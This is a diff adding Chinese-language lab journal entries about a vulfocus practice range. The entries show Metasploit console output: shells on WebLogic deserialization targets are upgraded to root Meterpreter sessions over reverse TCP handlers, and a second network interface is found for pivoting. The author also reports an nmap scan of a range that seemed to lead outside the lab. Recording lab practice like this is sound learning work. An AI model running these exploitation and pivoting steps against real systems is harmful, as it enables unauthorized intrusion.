@@ -165,3 +165,96 @@
 - 2023年7月17日，针对上面的问题大概检查了一下，发现是给Victim分配的内存太小了，导致在开启抓包后很快就爆内存了，倒不是metasploit的问题，只是场景主机没有响应了，使用普通sessions的shell也是死机状态😔
 
   这下又要重开了，绝望
+
+- 2023年7月17日，真的很想骂vulfocus这个平台的健壮性，场景如果不手动停止就会出现停了vulfocus容器但是环境容器还在运行的情况，重新开启vulfocus平台则会直接服务器错误，场景、镜像、网卡等配置全部清空，易用性拉满了属于是
+
+- 2023年7月17日，重新快速走了一半的流程，仍然是快速升级拿到的3个普通会话，此时已经没有问题了：
+
+  ```metasploit
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 3-5
+  [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3, 4, 5]
+
+  [*] Upgrading session ID: 3
+  [*] Starting exploit/multi/handler
+  [*] Started reverse TCP handler on 192.168.56.107:4433
+  [*] Sending stage (1017704 bytes) to 192.168.56.1
+  [*] Command stager progress: 100.00% (773/773 bytes)
+  [*] Sleeping 5 seconds to allow the previous handler to finish..
+  [*] Meterpreter session 6 opened (192.168.56.107:4433 -> 192.168.56.1:58666) at 2023-07-17 08:35:07 -0400
+  [*] Stopping exploit/multi/handler
+  [*] Upgrading session ID: 4
+  [*] Starting exploit/multi/handler
+  [*] Started reverse TCP handler on 192.168.56.107:4433
+  [*] Sending stage (1017704 bytes) to 192.168.56.1
+  [*] Command stager progress: 100.00% (773/773 bytes)
+  [*] Sleeping 5 seconds to allow the previous handler to finish..
+  [*] Meterpreter session 7 opened (192.168.56.107:4433 -> 192.168.56.1:58680) at 2023-07-17 08:35:20 -0400
+  [*] Stopping exploit/multi/handler
+  [*] Upgrading session ID: 5
+  [*] Starting exploit/multi/handler
+  [*] Started reverse TCP handler on 192.168.56.107:4433
+  [*] Sending stage (1017704 bytes) to 192.168.56.1
+  [*] Command stager progress: 100.00% (773/773 bytes)
+  [*] Sleeping 5 seconds to allow the previous handler to finish..
+  [*] Meterpreter session 8 opened (192.168.56.107:4433 -> 192.168.56.1:58684) at 2023-07-17 08:35:33 -0400
+  [*] Stopping exploit/multi/handler
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions
+
+  Active sessions
+  ===============
+
+    Id  Name  Type                   Information          Connection
+    --  ----  ----                   -----------          ----------
+    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58690 (172.29.108.146)
+    2         meterpreter x86/linux  root @ 192.171.84.5  192.168.56.107:4433 -> 192.168.56.1:58654 (172.29.108.146)
+    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58628 (192.171.84.2)
+    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58676 (192.171.84.3)
+    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58712 (192.171.84.4)
+    6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:58666 (192.171.84.2)
+    7         meterpreter x86/linux  root @ 192.172.85.3  192.168.56.107:4433 -> 192.168.56.1:58680 (192.171.84.3)
+    8         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:58684 (192.171.84.4)
+
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
+  ```
+
+  由于重启（准确来说是重铸）了环境所以IP和端口有变化，不过不影响，这次是在192.171.84.3上找到了第二张网卡，IP地址为192.172.85.3：
+
+  ```metasploit
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 7
+  [*] Starting interaction with 7...
+
+  meterpreter > ipconfig
+
+  Interface  1
+  ============
+  Name         : lo
+  Hardware MAC : 00:00:00:00:00:00
+  MTU          : 65536
+  Flags        : UP,LOOPBACK
+  IPv4 Address : 127.0.0.1
+  IPv4 Netmask : 255.0.0.0
+
+
+  Interface 17
+  ============
+  Name         : eth1
+  Hardware MAC : 02:42:c0:ab:54:03
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.171.84.3
+  IPv4 Netmask : 255.255.255.0
+
+
+  Interface 21
+  ============
+  Name         : eth0
+  Hardware MAC : 02:42:c0:ac:55:03
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.172.85.3
+  IPv4 Netmask : 255.255.255.0
+
+  meterpreter >
+  ```
+
+  这里原本决定换一个和视频不一样的方式来获取flag，尝试不离开msfconsole，通过套autoroute路由的方式（其实就是从外层到中层的方式），但是发现这个IP似乎是会跳到外网去了，traceroute了一下跳了不知道多少个路由，真的用nmap去扫192.172.85.0/24的时候254台主机全部在线，总感觉要突破一些不该突破的边界了，姑且先到这里，得重启一下环境才行😰
